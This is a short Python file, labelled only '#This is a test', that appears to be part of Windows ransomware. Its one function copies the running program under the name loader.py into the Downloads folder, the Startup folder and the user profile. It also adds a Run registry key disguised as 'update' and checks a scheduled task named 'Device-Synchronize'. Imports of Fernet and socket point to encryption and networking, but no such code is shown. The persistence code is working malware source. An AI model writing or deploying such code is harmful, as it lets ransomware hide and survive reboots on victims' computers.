#This is a test

import threading
import subprocess as sp
import socket
import uuid
import base64
import os
import time 
from cryptography.fernet import Fernet
import shutil
import ctypes
import sys

def persistence():
    
    ransomware_location = os.environ["USERPROFILE"] + "\\Downloads\\loader.py"
    startup_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\loader.py"
    task_scheduler_location = os.environ['USERPROFILE'] + "\\loader.py"

    if not os.path.exists(ransomware_location) or not os.path.exists(startup_location) or not os.path.exists(task_scheduler_location):

        if not os.path.exists(ransomware_location):
            shutil.copyfile(sys.executable, ransomware_location)
            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + ransomware_location + '" /f')

        if not os.path.exists(startup_location):# added
            shutil.copyfile(sys.executable, startup_location) # added

        if not os.path.exists(task_scheduler_location): # added
            shutil.copyfile(sys.executable, task_scheduler_location) # added
            output = os.popen(""" PowerShell /c Get-ScheduledTask "Device-Synchronize" """).read()
            if "Running" in output:
                pass
        
persistence()